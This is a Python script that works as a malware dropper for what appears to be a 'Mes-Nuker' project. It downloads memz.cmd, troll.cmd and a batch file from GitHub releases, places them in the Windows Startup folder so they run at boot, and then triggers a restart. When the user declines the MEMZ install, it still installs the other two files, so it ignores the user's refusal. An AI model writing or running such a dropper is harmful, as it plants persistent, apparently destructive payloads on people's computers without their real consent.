import wget
import os
import time
import shutil

user_input = input('Do you Want to download and install memz (yes/no): ')

if user_input.lower() == 'yes':
    time.sleep(2.0)
    print("installing memz")

    memz_url = "https://github.com/prorockz901/Mes-Nuker/releases/download/v1.1/memz.cmd"

    memz = wget.download(memz_url) #downloads first file from url
    print(memz)

    print("Downloaded 1 file")

    time.sleep(2.0)

    print("Moving the files")



    appdata =  os.getenv('APPDATA')

    startup_loc = appdata + \
     "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"


    # Moving first file 
    src_path = r"memz.cmd"
    dst_path = startup_loc
    shutil.move(src_path, dst_path)

    print("installed Memz Restart to take effect")
    time.sleep(10.0)
    exit()


elif user_input.lower() == 'no':
    print("Starting Installation")

time.sleep(2.0)

bat_url = "https://github.com/prorockz901/Mes-Nuker/releases/download/V1/Run-To-Start.bat"

bat = wget.download(bat_url) #downloads first file from url
print(bat)

bat2_url = "https://github.com/prorockz901/Mes-Nuker/releases/download/V1/troll.cmd"

bat2 = wget.download(bat2_url) #downloads the second file from url
print(bat2)


print("Downloaded 2 files")

time.sleep(2.0)

print("Moving the files")



appdata =  os.getenv('APPDATA')

startup_loc = appdata + \
     "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"


# Moving first file 
src_path = r"Run-To-Start.bat"
dst_path = startup_loc
shutil.move(src_path, dst_path)

# Moving secondt file 
src_path = r"troll.cmd"
dst_path = startup_loc
shutil.move(src_path, dst_path)

print("Moved the files ")
time.sleep(2.0)
print("Restarting in 10s")
time.sleep(10.0)
restart = input("Do you wish to restart your computer ? (yes / no): ")
  
if restart == 'no':
    exit()
else:
    os.system("shutdown /r /t 30")


